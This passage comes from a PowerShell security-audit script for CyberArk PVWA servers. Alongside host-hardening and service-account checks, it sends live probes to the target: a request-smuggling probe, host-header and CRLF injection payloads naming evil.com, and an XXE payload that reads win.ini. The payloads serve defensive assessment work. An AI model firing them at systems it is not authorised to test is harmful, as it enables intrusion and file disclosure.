                    -Finding "HTTP Parameter Pollution accepted" `
                    -Resource $payload `
                    -CurrentValue "Duplicate parameters processed" `
                    -ExpectedValue "Duplicate parameters rejected or single value used" `
                    -Recommendation "Implement strict parameter parsing and validation" `
                    -Severity "Low"
            }
        }
        catch { }
    }

    # Test HTTP Request Smuggling indicators
    try {
        $smuggleHeaders = @{
            "Transfer-Encoding" = "chunked"
            "Content-Length" = "0"
        }
        $response = Invoke-OPSECWebRequest -Uri "$PVWA/PasswordVault/" -Method POST -Headers $smuggleHeaders -Body "0`r`n`r`nG" -TimeoutSec 10

        if ($response.StatusCode -notin @(400, 411, 501)) {
            Add-Finding -Category "WAF Evasion" `
                -CISControl "API2" `
                -Finding "Potential HTTP Request Smuggling vector" `
                -Resource "HTTP Parser" `
                -CurrentValue "Conflicting Content-Length/Transfer-Encoding accepted" `
                -ExpectedValue "Request rejected" `
                -Recommendation "Configure web server to reject ambiguous requests" `
                -Severity "High"
        }
    }
    catch { }
}

function Test-AdvancedSecurityChecks {
    <#
    .SYNOPSIS
        Orchestrates all advanced red team security checks
    #>
    Write-AuditLog "Running Advanced Red Team Security Checks..." -Level Info

    if ($IncludeTimingAttacks -or $OPSECMode -eq $false) {
        try { Test-TimingAttacks } catch {
            Add-SkippedCheck -Category "Timing Attack" -CISControl "API1" `
                -CheckName "Timing Attack Analysis" `
                -Reason "Error: $($_.Exception.Message)" -Type "Error"
        }
    }

    if ($IncludeJWTTests) {
        try { Test-JWTSecurity } catch {
            Add-SkippedCheck -Category "JWT Security" -CISControl "API1" `
                -CheckName "JWT Security Testing" `
                -Reason "Error: $($_.Exception.Message)" -Type "Error"
        }
    }

    if ($IncludeWebSocketTests) {
        try { Test-WebSocketSecurity } catch {
            Add-SkippedCheck -Category "WebSocket Security" -CISControl "NET1" `
                -CheckName "WebSocket Security Testing" `
                -Reason "Error: $($_.Exception.Message)" -Type "Error"
        }
    }

    if ($IncludeWAFEvasion -and -not $OPSECMode) {
        try { Test-WAFEvasion } catch {
            Add-SkippedCheck -Category "WAF Evasion" -CISControl "BB11" `
                -CheckName "WAF Evasion Testing" `
                -Reason "Error: $($_.Exception.Message)" -Type "Error"
        }
    }
    elseif ($IncludeWAFEvasion -and $OPSECMode) {
        Add-SkippedCheck -Category "WAF Evasion" -CISControl "BB11" `
            -CheckName "WAF Evasion Testing" `
            -Reason "Skipped in OPSEC mode - too noisy" -Type "Skipped"
    }
}

#======================================================================
# HOST SECURITY CHECKS (Local Execution)
#======================================================================

function Test-HostSecurity {
    Write-AuditLog "Checking host security (requires local execution on CyberArk server)..." -Level Info

    # These checks only work when run locally on a CyberArk server
    $isLocalCyberArk = Test-Path "C:\Program Files (x86)\CyberArk" -ErrorAction SilentlyContinue

    if (-not $isLocalCyberArk) {
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST1" `
            -CheckName "Windows Firewall Check" `
            -Reason "Not running on CyberArk server - requires local execution" `
            -Type "NotApplicable"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST2" `
            -CheckName "Service Account Check" `
            -Reason "Not running on CyberArk server - requires local execution" `
            -Type "NotApplicable"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST3" `
            -CheckName "Credential Caching Check" `
            -Reason "Not running on CyberArk server - requires local execution" `
            -Type "NotApplicable"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST4" `
            -CheckName "Event Log Configuration Check" `
            -Reason "Not running on CyberArk server - requires local execution" `
            -Type "NotApplicable"
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST5" `
            -CheckName "Antivirus/EDR Status Check" `
            -Reason "Not running on CyberArk server - requires local execution" `
            -Type "NotApplicable"
        return
    }

    try { Test-WindowsFirewall } catch { Add-SkippedCheck -Category "Host Security" -CISControl "HOST1" -CheckName "Windows Firewall" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-ServiceAccounts } catch { Add-SkippedCheck -Category "Host Security" -CISControl "HOST2" -CheckName "Service Accounts" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-CredentialCaching } catch { Add-SkippedCheck -Category "Host Security" -CISControl "HOST3" -CheckName "Credential Caching" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-EventLogConfiguration } catch { Add-SkippedCheck -Category "Host Security" -CISControl "HOST4" -CheckName "Event Log Configuration" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-AntivirusStatus } catch { Add-SkippedCheck -Category "Host Security" -CISControl "HOST5" -CheckName "Antivirus Status" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
    try { Test-CyberArkServices } catch { Add-SkippedCheck -Category "CyberArk Services" -CISControl "7.3" -CheckName "CyberArk Services" -Reason "Error: $($_.Exception.Message)" -Type "Error" }
}

function Test-WindowsFirewall {
    Write-AuditLog "Checking Windows Firewall configuration..." -Level Info

    try {
        $firewallProfiles = Get-NetFirewallProfile -ErrorAction SilentlyContinue

        foreach ($fwProfile in $firewallProfiles) {
            if (-not $fwProfile.Enabled) {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST1" `
                    -Finding "Windows Firewall disabled" `
                    -Resource "Firewall Profile: $($fwProfile.Name)" `
                    -CurrentValue "Disabled" `
                    -ExpectedValue "Enabled" `
                    -Recommendation "Enable Windows Firewall for all profiles" `
                    -Severity "Critical"
            }

            if ($fwProfile.DefaultInboundAction -ne "Block") {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST1" `
                    -Finding "Firewall default inbound not set to Block" `
                    -Resource "Firewall Profile: $($fwProfile.Name)" `
                    -CurrentValue $fwProfile.DefaultInboundAction `
                    -ExpectedValue "Block" `
                    -Recommendation "Set default inbound action to Block" `
                    -Severity "High"
            }
        }

        # Check for overly permissive rules
        $anyAnyRules = Get-NetFirewallRule -Enabled True -Direction Inbound | Where-Object {
            $portFilter = $_ | Get-NetFirewallPortFilter
            $addressFilter = $_ | Get-NetFirewallAddressFilter
            $portFilter.LocalPort -eq "Any" -and $addressFilter.RemoteAddress -eq "Any"
        }

        if ($anyAnyRules.Count -gt 0) {
            Add-Finding -Category "Host Security" `
                -CISControl "HOST1" `
                -Finding "Overly permissive firewall rules detected" `
                -Resource "Windows Firewall" `
                -CurrentValue "$($anyAnyRules.Count) rules allow any port from any address" `
                -ExpectedValue "Restrictive rules only" `
                -Recommendation "Review and restrict firewall rules" `
                -Severity "High"
        }
    }
    catch {
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST1" `
            -CheckName "Windows Firewall Check" `
            -Reason "Could not check Windows Firewall: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-ServiceAccounts {
    Write-AuditLog "Checking CyberArk service account configurations..." -Level Info

    $cyberArkServices = @(
        "CyberArk Central Policy Manager Scanner",
        "CyberArk Password Manager",
        "CyberArk Vault Disaster Recovery",
        "CyberArk Event Notification Engine",
        "CyberArk Privileged Session Manager",
        "PrivateArk Server",
        "PrivateArk Database",
        "PrivateArk Remote Control Agent"
    )

    foreach ($serviceName in $cyberArkServices) {
        try {
            $service = Get-WmiObject -Class Win32_Service -Filter "Name='$serviceName'" -ErrorAction SilentlyContinue

            if ($service) {
                $serviceAccount = $service.StartName

                # Check if running as LocalSystem (not recommended for some services)
                if ($serviceAccount -eq "LocalSystem" -and $serviceName -notmatch "PrivateArk") {
                    Add-Finding -Category "Host Security" `
                        -CISControl "HOST2" `
                        -Finding "Service running as LocalSystem" `
                        -Resource "Service: $serviceName" `
                        -CurrentValue $serviceAccount `
                        -ExpectedValue "Dedicated service account" `
                        -Recommendation "Use a dedicated service account with minimal privileges" `
                        -Severity "Medium"
                }

                # Check for interactive services
                if ($service.DesktopInteract) {
                    Add-Finding -Category "Host Security" `
                        -CISControl "HOST2" `
                        -Finding "Service allows desktop interaction" `
                        -Resource "Service: $serviceName" `
                        -CurrentValue "Desktop interaction enabled" `
                        -ExpectedValue "No desktop interaction" `
                        -Recommendation "Disable desktop interaction for services" `
                        -Severity "Medium"
                }
            }
        }
        catch { }
    }
}

function Test-CredentialCaching {
    Write-AuditLog "Checking credential caching configuration..." -Level Info

    try {
        # Check cached logons count
        $cachedLogons = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" -Name "CachedLogonsCount" -ErrorAction SilentlyContinue).CachedLogonsCount

        if ($cachedLogons -and [int]$cachedLogons -gt 0) {
            Add-Finding -Category "Host Security" `
                -CISControl "HOST3" `
                -Finding "Credential caching enabled" `
                -Resource "Windows Credential Cache" `
                -CurrentValue "$cachedLogons cached logons allowed" `
                -ExpectedValue "0 (disabled on servers)" `
                -Recommendation "Disable credential caching on CyberArk servers" `
                -Severity "High"
        }

        # Check WDigest
        $wdigest = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" -Name "UseLogonCredential" -ErrorAction SilentlyContinue).UseLogonCredential

        if ($wdigest -eq 1) {
            Add-Finding -Category "Host Security" `
                -CISControl "HOST3" `
                -Finding "WDigest authentication enabled" `
                -Resource "Windows Security" `
                -CurrentValue "WDigest enabled (cleartext passwords in memory)" `
                -ExpectedValue "WDigest disabled" `
                -Recommendation "Disable WDigest to prevent credential theft" `
                -Severity "Critical"
        }

        # Check LSA Protection
        $lsaProtection = (Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RunAsPPL" -ErrorAction SilentlyContinue).RunAsPPL

        if ($lsaProtection -ne 1) {
            Add-Finding -Category "Host Security" `
                -CISControl "HOST3" `
                -Finding "LSA Protection not enabled" `
                -Resource "Windows Security" `
                -CurrentValue "LSA Protection disabled" `
                -ExpectedValue "LSA Protection enabled" `
                -Recommendation "Enable LSA Protection (RunAsPPL)" `
                -Severity "High"
        }
    }
    catch {
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST3" `
            -CheckName "Credential Caching Check" `
            -Reason "Could not check credential caching: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-EventLogConfiguration {
    Write-AuditLog "Checking Windows Event Log configuration..." -Level Info

    try {
        $securityLog = Get-WinEvent -ListLog Security -ErrorAction SilentlyContinue

        if ($securityLog) {
            # Check log size
            $logSizeMB = [math]::Round($securityLog.MaximumSizeInBytes / 1MB, 2)
            if ($logSizeMB -lt 1024) {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST4" `
                    -Finding "Security log size too small" `
                    -Resource "Windows Security Event Log" `
                    -CurrentValue "$logSizeMB MB" `
                    -ExpectedValue "1024 MB or more" `
                    -Recommendation "Increase security log size for forensic retention" `
                    -Severity "Medium"
            }

            # Check retention
            if ($securityLog.LogMode -ne "Circular") {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST4" `
                    -Finding "Security log not set to circular mode" `
                    -Resource "Windows Security Event Log" `
                    -CurrentValue $securityLog.LogMode `
                    -ExpectedValue "Circular with adequate size" `
                    -Recommendation "Configure appropriate log retention" `
                    -Severity "Low"
            }
        }

        # Check if audit policies are configured
        $auditCategories = @(
            "Account Logon",
            "Account Management",
            "Logon/Logoff",
            "Object Access",
            "Policy Change",
            "Privilege Use",
            "System"
        )

        foreach ($category in $auditCategories) {
            $auditPolicy = auditpol /get /category:$category 2>$null

            if ($auditPolicy -match "No Auditing") {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST4" `
                    -Finding "Audit policy not configured" `
                    -Resource "Audit Category: $category" `
                    -CurrentValue "No Auditing" `
                    -ExpectedValue "Success and Failure" `
                    -Recommendation "Enable auditing for $category" `
                    -Severity "High"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST4" `
            -CheckName "Event Log Configuration Check" `
            -Reason "Could not check event log configuration: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-AntivirusStatus {
    Write-AuditLog "Checking antivirus/EDR status..." -Level Info

    try {
        # Check Windows Defender status
        $defenderStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue

        if ($defenderStatus) {
            if (-not $defenderStatus.AntivirusEnabled) {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST5" `
                    -Finding "Windows Defender antivirus disabled" `
                    -Resource "Windows Defender" `
                    -CurrentValue "Disabled" `
                    -ExpectedValue "Enabled" `
                    -Recommendation "Enable antivirus protection" `
                    -Severity "Critical"
            }

            if (-not $defenderStatus.RealTimeProtectionEnabled) {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST5" `
                    -Finding "Real-time protection disabled" `
                    -Resource "Windows Defender" `
                    -CurrentValue "Disabled" `
                    -ExpectedValue "Enabled" `
                    -Recommendation "Enable real-time protection" `
                    -Severity "Critical"
            }

            # Check signature age
            $signatureAge = (Get-Date) - $defenderStatus.AntivirusSignatureLastUpdated
            if ($signatureAge.TotalDays -gt 7) {
                Add-Finding -Category "Host Security" `
                    -CISControl "HOST5" `
                    -Finding "Antivirus signatures outdated" `
                    -Resource "Windows Defender" `
                    -CurrentValue "$([math]::Round($signatureAge.TotalDays)) days old" `
                    -ExpectedValue "Updated within 7 days" `
                    -Recommendation "Update antivirus signatures" `
                    -Severity "High"
            }
        }
    }
    catch {
        Add-SkippedCheck -Category "Host Security" -CISControl "HOST5" `
            -CheckName "Antivirus Status Check" `
            -Reason "Could not check antivirus status: $($_.Exception.Message)" `
            -Type "Error"
    }
}

function Test-CyberArkServices {
    Write-AuditLog "Checking CyberArk service status and configuration..." -Level Info

    $criticalServices = @(
        @{ Name = "PrivateArk Server"; Critical = $true },
        @{ Name = "PrivateArk Database"; Critical = $true },
        @{ Name = "CyberArk Password Manager"; Critical = $false },
        @{ Name = "CyberArk Central Policy Manager Scanner"; Critical = $false },
        @{ Name = "CyberArk Vault Disaster Recovery"; Critical = $false }
    )

    foreach ($svcInfo in $criticalServices) {
        try {
            $service = Get-Service -Name $svcInfo.Name -ErrorAction SilentlyContinue

            if ($service) {
                if ($service.Status -ne "Running") {
                    $severity = if ($svcInfo.Critical) { "Critical" } else { "High" }
                    Add-Finding -Category "CyberArk Services" `
                        -CISControl "7.3" `
                        -Finding "CyberArk service not running" `
                        -Resource $svcInfo.Name `
                        -CurrentValue $service.Status `
                        -ExpectedValue "Running" `
                        -Recommendation "Start the $($svcInfo.Name) service" `
                        -Severity $severity
                }

                if ($service.StartType -ne "Automatic") {
                    Add-Finding -Category "CyberArk Services" `
                        -CISControl "7.3" `
                        -Finding "Service not set to automatic start" `
                        -Resource $svcInfo.Name `
                        -CurrentValue $service.StartType `
                        -ExpectedValue "Automatic" `
                        -Recommendation "Set service to start automatically" `
                        -Severity "Medium"
                }
            }
        }
        catch { }
    }
}

function Test-ComponentVersions {
    Write-AuditLog "Detecting CyberArk component versions..." -Level Info

    try {
        # Try to detect version from PVWA response
        $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/" -Method GET -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

        # Check for version in various locations
        $versionPatterns = @(
            'version["\s:]+([0-9]+\.[0-9]+\.[0-9]+)',
            'PVWA["\s:]+([0-9]+\.[0-9]+)',
            'CyberArk["\s:]+([0-9]+\.[0-9]+)',
            'build["\s:]+([0-9]+)'
        )

        foreach ($pattern in $versionPatterns) {
            if ($response.Content -match $pattern) {
                $detectedVersion = $matches[1]
                Write-AuditLog "Detected potential version: $detectedVersion" -Level Info

                Add-Finding -Category "Version Detection" `
                    -CISControl "BB2" `
                    -Finding "CyberArk version detected" `
                    -Resource "PVWA" `
                    -CurrentValue "Version: $detectedVersion" `
                    -ExpectedValue "Version information not disclosed" `
                    -Recommendation "Review version for known CVEs; consider hiding version info" `
                    -Severity "Info" `
                    -Status "Pass"
                break
            }
        }

        # Check via API
        $serverInfo = Invoke-RestMethod -Uri "$PVWA/PasswordVault/api/server" -Method GET -TimeoutSec 10 -ErrorAction SilentlyContinue

        if ($serverInfo) {
            Add-Finding -Category "Version Detection" `
                -CISControl "BB2" `
                -Finding "Server information endpoint accessible" `
                -Resource "/api/server" `
                -CurrentValue "Server info disclosed" `
                -ExpectedValue "Endpoint restricted" `
                -Recommendation "Restrict access to server information endpoint" `
                -Severity "Medium"
        }
    }
    catch { }

    # Check local installation if running on CyberArk server
    $installPaths = @(
        "C:\Program Files (x86)\CyberArk\Password Manager\",
        "C:\Program Files (x86)\CyberArk\PSM\",
        "C:\Program Files (x86)\CyberArk\PVWA\"
    )

    foreach ($path in $installPaths) {
        if (Test-Path $path -ErrorAction SilentlyContinue) {
            try {
                $exeFiles = Get-ChildItem -Path $path -Filter "*.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1

                if ($exeFiles) {
                    $version = (Get-Item $exeFiles.FullName).VersionInfo.FileVersion

                    if ($version) {
                        Write-AuditLog "Detected local component version: $version at $path" -Level Info

                        # Check against known vulnerable versions
                        $vulnerableVersions = @{
                            "10.9" = "CVE-2021-31796"
                            "10.10" = "Multiple CVEs"
                            "11.0" = "CVE-2021-44228 (if Java components)"
                            "11.1" = "CVE-2022-22536"
                        }

                        foreach ($vulnVersion in $vulnerableVersions.Keys) {
                            if ($version -like "$vulnVersion*") {
                                Add-Finding -Category "Version Security" `
                                    -CISControl "BB11" `
                                    -Finding "Potentially vulnerable CyberArk version" `
                                    -Resource $path `
                                    -CurrentValue "Version $version" `
                                    -ExpectedValue "Latest patched version" `
                                    -Recommendation "Check for patches: $($vulnerableVersions[$vulnVersion])" `
                                    -Severity "High"
                            }
                        }
                    }
                }
            }
            catch { }
        }
    }
}

function Test-SessionSecurity {
    Write-AuditLog "Testing session security mechanisms..." -Level Info

    # Test session fixation
    try {
        $session1 = Invoke-WebRequest -Uri "$PVWA/PasswordVault/" -Method GET -UseBasicParsing -SessionVariable webSession -TimeoutSec 10 -ErrorAction SilentlyContinue

        $preAuthCookies = @()
        foreach ($cookie in $webSession.Cookies.GetCookies($PVWA)) {
            $preAuthCookies += "$($cookie.Name)=$($cookie.Value)"
        }

        # After "authentication" (simulated), check if session ID changes
        Add-Finding -Category "Session Security" `
            -CISControl "V7.2" `
            -Finding "Session tokens set before authentication" `
            -Resource "PVWA Session" `
            -CurrentValue "Pre-auth cookies: $($preAuthCookies.Count)" `
            -ExpectedValue "Session regenerated after auth (verify manually)" `
            -Recommendation "Verify session ID regeneration after authentication" `
            -Severity "Info" `
            -Status "Pass"
    }
    catch { }

    # Test concurrent session handling
    Add-Finding -Category "Session Security" `
        -CISControl "V7.3" `
        -Finding "Concurrent session limit (manual verification required)" `
        -Resource "PVWA Session Management" `
        -CurrentValue "Manual test required" `
        -ExpectedValue "Concurrent sessions limited or detected" `
        -Recommendation "Verify concurrent session limits are enforced" `
        -Severity "Info" `
        -Status "Pass"
}

function Test-HeaderInjection {
    Write-AuditLog "Testing for header injection vulnerabilities..." -Level Info

    # Host header injection
    $hostHeaders = @(
        @{ Host = "evil.com"; XForwardedHost = $null },
        @{ Host = $null; XForwardedHost = "evil.com" },
        @{ Host = "evil.com:443"; XForwardedHost = $null }
    )

    foreach ($headerSet in $hostHeaders) {
        try {
            $headers = @{}
            if ($headerSet.Host) { $headers["Host"] = $headerSet.Host }
            if ($headerSet.XForwardedHost) { $headers["X-Forwarded-Host"] = $headerSet.XForwardedHost }

            $response = Invoke-WebRequest -Uri "$PVWA/PasswordVault/" -Method GET -Headers $headers -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.Content -match "evil\.com") {
                Add-Finding -Category "Header Security" `
                    -CISControl "V7.1" `
                    -Finding "Host header injection vulnerability" `
                    -Resource "PVWA" `
                    -CurrentValue "Malicious host reflected in response" `
                    -ExpectedValue "Host header validated" `
                    -Recommendation "Validate and whitelist allowed Host headers" `
                    -Severity "High"
            }
        }
        catch { }
    }

    # CRLF Injection
    $crlfPayloads = @(
        "/PasswordVault/%0d%0aSet-Cookie:%20malicious=true",
        "/PasswordVault/?redirect=%0d%0aLocation:%20http://evil.com"
    )

    foreach ($payload in $crlfPayloads) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$payload" -Method GET -UseBasicParsing -TimeoutSec 5 -ErrorAction SilentlyContinue

            if ($response.Headers["Set-Cookie"] -match "malicious" -or $response.Headers["Location"] -match "evil\.com") {
                Add-Finding -Category "Header Security" `
                    -CISControl "V7.1" `
                    -Finding "CRLF injection vulnerability" `
                    -Resource $payload `
                    -CurrentValue "Headers injected via CRLF" `
                    -ExpectedValue "CRLF sequences filtered" `
                    -Recommendation "Sanitize input to prevent CRLF injection" `
                    -Severity "High"
            }
        }
        catch { }
    }
}

function Test-XXEVulnerability {
    Write-AuditLog "Testing for XXE vulnerabilities in SOAP endpoints..." -Level Info

    $soapEndpoints = @(
        "/PasswordVault/WebServices/PIMServices.svc",
        "/PasswordVault/WebServices/auth/CyberArk/CyberArkAuthenticationService.svc"
    )

    $xxePayload = @"
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>
    <test>&xxe;</test>
  </soap:Body>
</soap:Envelope>
"@

    foreach ($endpoint in $soapEndpoints) {
        try {
            $response = Invoke-WebRequest -Uri "$PVWA$endpoint" -Method POST -Body $xxePayload -ContentType "text/xml" -UseBasicParsing -TimeoutSec 10 -ErrorAction SilentlyContinue

            if ($response.Content -match "\[fonts\]|\[extensions\]|for 16-bit app support") {
                Add-Finding -Category "XXE Vulnerability" `
                    -CISControl "API2" `
                    -Finding "XXE vulnerability in SOAP endpoint" `
                    -Resource $endpoint `
                    -CurrentValue "External entity processed" `
                    -ExpectedValue "XXE processing disabled" `
                    -Recommendation "Disable external entity processing in XML parser" `
                    -Severity "Critical"
            }
        }
        catch { }
    }
}

#======================================================================
# MACHINE IDENTITY SECURITY CHECKS (MID1-MID6)
#======================================================================

function Test-MachineIdentitySecurity {
    Write-AuditLog "Auditing Machine Identity Security..." -Level Info

    Test-ServiceAccountEnumeration
    Test-MachineIdentityRotation
    Test-OverPrivilegedServiceAccounts
    Test-CertificateAuthentication
    Test-AppIDSecurity
    Test-StaleMachineIdentities
}

function Test-ServiceAccountEnumeration {
    Write-AuditLog "Enumerating service accounts and machine identities (MID1)..." -Level Info

    # Get all accounts and filter for service accounts
    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID1" `
            -CheckName "Service Account Enumeration" `
            -Reason "Could not retrieve accounts from API" `
            -Type "Error"
        return
    }

    $serviceAccountPatterns = @("svc_", "service", "app_", "batch", "daemon", "system", "_sa", "svc-")
    $serviceAccounts = @()

    foreach ($account in $accounts.value) {
        $accountName = $account.name.ToLower()
        $userName = if ($account.userName) { $account.userName.ToLower() } else { "" }
        
        foreach ($pattern in $serviceAccountPatterns) {
            if ($accountName -match $pattern -or $userName -match $pattern) {
                $serviceAccounts += $account
                break
            }
        }
    }

    $script:AuditStats.ServiceAccountsFound = $serviceAccounts.Count

    if ($serviceAccounts.Count -gt 0) {
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID1" `
            -Finding "Service accounts identified in vault" `
            -Resource "Service Account Inventory" `
            -CurrentValue "$($serviceAccounts.Count) service accounts found" `
            -ExpectedValue "All service accounts should be reviewed" `
            -Recommendation "Review service account privileges and ensure proper lifecycle management" `
            -Severity "Info" `
            -Status "Pass"
    }

    # Check for machine identities in users
    $users = Invoke-CyberArkAPI -Endpoint "/Users?limit=$($script:Config.PageLimit)"
    
    if ($users) {
        $machineUsers = $users.Users | Where-Object { 
            $_.userType -eq "ServiceUser" -or 
            $_.source -eq "CyberArk" -and $_.userName -match "svc_|app_|system" 
        }

        if ($machineUsers.Count -gt 0) {
            Add-Finding -Category "Machine Identity" `
                -CISControl "MID1" `
                -Finding "Machine identity users found" `
                -Resource "User Accounts" `
                -CurrentValue "$($machineUsers.Count) machine/service users" `
                -ExpectedValue "Machine identities documented and reviewed" `
                -Recommendation "Ensure all machine identities follow least privilege principles" `
                -Severity "Info" `
                -Status "Pass"
        }
    }
}

function Test-MachineIdentityRotation {
    Write-AuditLog "Checking machine identity password rotation (MID2)..." -Level Info

    $accounts = Invoke-CyberArkAPI -Endpoint "/Accounts?limit=$($script:Config.PageLimit)"
    
    if (-not $accounts) {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID2" `
            -CheckName "Machine Identity Rotation" `
            -Reason "Could not retrieve accounts from API" `
            -Type "Error"
        return
    }

    $serviceAccountPatterns = @("svc_", "service", "app_", "batch", "daemon", "system", "_sa")
    $noRotationAccounts = @()
    $stalePasswordAccounts = @()
    $threshold = (Get-Date).AddDays(-$script:Config.MaxSecretAgeDays)

    foreach ($account in $accounts.value) {
        $accountName = $account.name.ToLower()
        $isServiceAccount = $false
        
        foreach ($pattern in $serviceAccountPatterns) {
            if ($accountName -match $pattern) {
                $isServiceAccount = $true
                break
            }
        }

        if ($isServiceAccount) {
            # Check if automatic management is disabled
            if ($account.secretManagement.automaticManagementEnabled -eq $false) {
                $noRotationAccounts += $account.name
            }

            # Check password age
            if ($account.secretManagement.lastModifiedTime) {
                $lastModified = [DateTime]::Parse($account.secretManagement.lastModifiedTime)
                if ($lastModified -lt $threshold) {
                    $stalePasswordAccounts += @{
                        Name = $account.name
                        LastModified = $lastModified
                        Age = ((Get-Date) - $lastModified).Days
                    }
                }
            }
        }
    }

    if ($noRotationAccounts.Count -gt 0) {
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID2" `
            -Finding "Service accounts without automatic password rotation" `
            -Resource "Password Rotation Configuration" `
            -CurrentValue "$($noRotationAccounts.Count) accounts without rotation" `
            -ExpectedValue "All service accounts with automatic rotation" `
            -Recommendation "Enable automatic password management for service accounts" `
            -Severity "High"
    }

    if ($stalePasswordAccounts.Count -gt 0) {
        $oldest = ($stalePasswordAccounts | Sort-Object Age -Descending | Select-Object -First 1)
        Add-Finding -Category "Machine Identity" `
            -CISControl "MID2" `
            -Finding "Service accounts with stale passwords" `
            -Resource "Password Age Analysis" `
            -CurrentValue "$($stalePasswordAccounts.Count) accounts (oldest: $($oldest.Age) days)" `
            -ExpectedValue "Passwords rotated within $($script:Config.MaxSecretAgeDays) days" `
            -Recommendation "Rotate passwords for accounts exceeding age threshold" `
            -Severity "Medium"
    }
}

function Test-OverPrivilegedServiceAccounts {
    Write-AuditLog "Checking for over-privileged service accounts (MID3)..." -Level Info

    $safes = Invoke-CyberArkAPI -Endpoint "/Safes?limit=$($script:Config.PageLimit)"
    
    if (-not $safes) {
        Add-SkippedCheck -Category "Machine Identity" -CISControl "MID3" `
            -CheckName "Service Account Privileges" `
            -Reason "Could not retrieve safes from API" `
            -Type "Error"
        return
    }

    $serviceAccountPatterns = @("svc_", "service", "app_", "batch", "system", "_sa")
    $serviceAccountAccess = @{}

    foreach ($safe in $safes.value) {
        $safeName = $safe.safeName
        
        # Skip system safes
        if ($safeName -match "^(System|VaultInternal|Notification|PVWAConfig)") { continue }

        $members = Invoke-CyberArkAPI -Endpoint "/Safes/$safeName/Members"
        
        if ($members -and $members.value) {
            foreach ($member in $members.value) {
                $memberName = $member.memberName.ToLower()
                
                foreach ($pattern in $serviceAccountPatterns) {
                    if ($memberName -match $pattern) {
                        if (-not $serviceAccountAccess.ContainsKey($member.memberName)) {
                            $serviceAccountAccess[$member.memberName] = @{
                                Safes = @()
                                Permissions = @()
                            }
                        }
                        $serviceAccountAccess[$member.memberName].Safes += $safeName
                        
                        # Check for elevated permissions
                        if ($member.permissions.ManageSafe -or 
                            $member.permissions.ManageSafeMembers -or 
                            $member.permissions.DeleteAccounts) {
                            $serviceAccountAccess[$member.memberName].Permissions += "Elevated"
                        }
                        break
                    }
                }
            }
        }
    }

    # Find over-privileged accounts
    $overPrivileged = $serviceAccountAccess.GetEnumerator() | Where-Object { 
        $_.Value.Safes.Count -gt $script:Config.MaxServiceAccountSafeMemberships -or 
        $_.Value.Permissions -contains "Elevated"
    }

    if ($overPrivileged.Count -gt 0) {
        foreach ($account in $overPrivileged) {
            $reason = if ($account.Value.Safes.Count -gt $script:Config.MaxServiceAccountSafeMemberships) {
                "Access to $($account.Value.Safes.Count) safes (threshold: $($script:Config.MaxServiceAccountSafeMemberships))"
            } else {
                "Has elevated permissions (ManageSafe/ManageSafeMembers/DeleteAccounts)"
            }

            Add-Finding -Category "Machine Identity" `
                -CISControl "MID3" `
                -Finding "Over-privileged service account detected" `
                -Resource $account.Key `
                -CurrentValue $reason `
                -ExpectedValue "Least privilege access only" `
                -Recommendation "Review and reduce service account permissions" `
                -Severity "High"
        }
    }
}

function Test-CertificateAuthentication {
    Write-AuditLog "Checking certificate-based authentication configuration (MID4)..." -Level Info

    # Check authentication methods configuration
    $authMethods = Invoke-CyberArkAPI -Endpoint "/Configuration/AuthenticationMethods"
    
    if ($authMethods) {
        $certAuth = $authMethods | Where-Object { $_.id -match "cert|pki|x509" }
        
        if (-not $certAuth) {
            Add-Finding -Category "Machine Identity" `
                -CISControl "MID4" `
                -Finding "Certificate-based authentication not configured" `
                -Resource "Authentication Methods" `
                -CurrentValue "No certificate authentication found" `
                -ExpectedValue "Certificate authentication available for machine identities" `
                -Recommendation "Consider implementing certificate-based authentication for machine identities" `
                -Severity "Medium"
        }
    }

    # Check for certificate-based platforms
    $platforms = Invoke-CyberArkAPI -Endpoint "/Platforms"
    
    if ($platforms) {
        $certPlatforms = $platforms.Platforms | Where-Object { 
            $_.general.platformType -match "cert|ssh.*key" 
        }

        if ($certPlatforms) {
            Add-Finding -Category "Machine Identity" `
                -CISControl "MID4" `
                -Finding "Certificate/Key platforms configured" `
                -Resource "Platforms" `
